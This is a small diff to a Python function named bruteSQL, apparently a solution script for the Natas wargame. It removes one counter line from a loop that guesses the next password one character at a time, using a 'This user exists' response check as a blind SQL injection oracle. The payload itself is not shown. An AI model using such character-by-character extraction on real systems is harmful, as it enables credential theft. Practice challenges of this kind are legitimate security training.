@@ -26,7 +26,6 @@ def bruteSQL():
             #Checks for successful query, adds char to natas16pw if successful
             if "This user exists" in response.text:
                 natas16pw += char
-                pwCharCount += 1
                 print (natas16pw)
 
     print("Final password for natas16: ", natas16pw)    
